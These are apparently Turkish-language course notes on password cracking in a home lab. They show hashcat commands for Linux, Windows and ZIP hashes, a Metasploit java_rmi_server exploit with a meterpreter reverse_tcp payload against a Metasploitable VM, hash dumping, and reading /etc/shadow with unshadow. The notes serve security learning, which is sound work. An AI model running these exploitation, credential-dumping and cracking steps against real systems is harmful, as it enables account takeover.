	HASH CRACKING
 Search for "hashcat"
 Çok fazla parola denememiz gerektiği için ve bunun için de işlemci gerektiği için,
 Kendi işletim sistemimiz üzerinden gerçekleştirmemiz daha hızlı olacaktır.

  Download Hashcat
apt-get install hashcat
hashcat --help	-> Yapabileceğimiz tüm alternatifler




  Cracking Linux Password
hashcat --help | grep 512 
hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt --potfile-disable	
	-> 1800: Kullanmak istediğimiz mod.
	-> Hash'imiz kırıldı!
	-> HASH'imizin yanında Kali Şifremiz gözücekecektir.





  Cracking Windows Password
hashcat --help | grep md5
hashcat -m 500 mywwindowshash.txt /usr/share/wordlists/fasttrack.txt --potfile-disable
	-> 500: Kullanmak istediğimiz mod.
	-> Şifre Wordlistin içerisinde ise şifreyi kıracaktır.




  Cracking ZIP  Password
cd Downloads/	-> Zip'in bulunduğu yer.
zip2john mysecret.zip	-> Eğer HASH'i bulamazsak,
zip2john mysecret.zip | cut -d ':' -f  2 > myzip.txt	-> Hash'i bulmakla kalmaz ve bunu istediğimiz txt dosyasına kaydeder.

hashcat --help | grep Zip	-> 7-Zip, WinZip hangisi ile ziplendiyse o mod ile çalıştırmamız gerekiyor
hashcat -m 13600 myzip.txt /usr/share/wordlists/fasttrack.txt --potfile-disable
	-> Zip için HASH Kırma işlemi tamamlandı!





 ALT KISIM COK DA ONEMLI DEGIL
  HASH Toplama
msfconsole
use exploit/multi/misc/java_rmi_server	-> Metasploitable'da java_rmi_server açığı vardır.
show payloads
set PAYLOAD payload/java/meterpreter/reverse_tcp
set rhosts 10.0.2.4	-> Metasploitable ip'si
exploit		-> Metasploitable HACKLENDI!
sessions -l
sessions -1


  Metasploitable için Hash Oluşturma
 Hangi sistemi hacklediğinizin bir önemi yok hash toplamak için:
hashdump -> Çalışmaz ise (linux):
run post/linux/gather/hashdump


 Çalıştırdığımızda çıkan ve başında [+] olan hashleri kopyalıyoruz.
cd Downloads/
nano metasploitable-hash.txt
ctrl + v	-> [+]'ları sil sadece HASH'ler duracak.
ctrl + o -> enter -> ctrl + x
 Metasploitable için Hash .txt'miz oluşturuldu.
 Buradaki işlemimiz bitti.





  Kali için Hash Oluşturma
cat /etc/passwd/	-> root:x:0:0... -> x de olması lazım? bu x dosyası ise shadow içerisinde.
cat /etc/shasdow/	-> Parolaların HASH'lenmiş halini görüyoruz.
 Bu 2'sini birleştirip bir şifre haline getirmemiz gerekiyor.

unshadow /etc/passwd /etc/shadow	-> Her 2 dosyayı da birleştirmeye yarar.
 Burada çıkan hash'i de kopyaladıktan sonra,
cd Downloads/
nano Kali-Hash.txt
ctrl + v -> ctrl + o -> enter -> ctrl + x
 Kali için Hash.txt'miz oluşturuldu.





  İnternet üzerinden Hash Oluşturma
 Searach for "ntlm and lm generator"
 Herhangi bir şifre girip Calculate Hashes dediğimizde Hash bizim için oluşturulacaktır.